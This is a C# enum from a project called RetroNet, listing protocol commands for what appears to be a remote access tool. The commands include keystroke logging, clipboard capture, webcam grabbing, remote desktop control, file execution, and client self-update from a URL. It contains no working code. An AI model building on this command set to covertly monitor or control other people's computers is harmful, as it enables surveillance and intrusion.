using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RetroNet.Classes
{
    public enum Command : byte
    {
        EncryptionKey = 0x0,
        ConnectInfo = 0x1,
        CloseSocket = 0x2,
        CpuRam = 0x3,
        UninstallClient = 0x4,
        RestartClient = 0x5,
        UpdateClientFile = 0x6,
        UpdateClientUrl = 0x7,
        ShutDownComputer = 0x8,
        RestartComputer = 0x9,
        LogOffComputer = 0xA,
        StartRemoteDesktop = 0xB,
        StopRemoteDesktop = 0xC,
        RemoteDesktopImage = 0xD,
        RemoteDesktopQuality = 0xE,
        RemoteDesktopKeyDown = 0xF,
        RemoteDesktopKeyUp = 0x10,
        RemoteDesktopLDown = 0x11,
        RemoteDesktopLUp = 0x12,
        RemoteDesktopRDown = 0x13,
        RemoteDesktopRUp = 0x14,
        GetWebcam = 0x15,
        StartWebcam = 0x16,
        StopWebcam = 0x17,
        WebcamQuality = 0x18,
        WebcamImage = 0x19,
        GetRootDrives = 0x1A,
        Navigate = 0x1B,
        ExecuteFile = 0x1C,
        DeleteFile = 0x1D,
        DeleteFolder = 0x1E,
        UploadFileBegin = 0x1F,
        UploadFilePart = 0x20,
        UploadFileEnd = 0x21,
        DownloadFileBegin = 0x22,
        DownloadFilePart = 0x23,
        DownloadFileEnd = 0x24,
        GetProcessList = 0x25,
        SuspendProcess = 0x26,
        ResumeProcess = 0x27,
        KillProcess = 0x28,
        KeystrokeStart = 0x29,
        KeystrokeStop = 0x2A,
        KeystrokeInfo = 0x2B,
        ClipboardStart = 0x2C,
        ClipboardStop = 0x2D,
        ClipboardInfo = 0x2E,
        GetApplications = 0x2F,
        UninstallApplication = 0x30,

    }
}
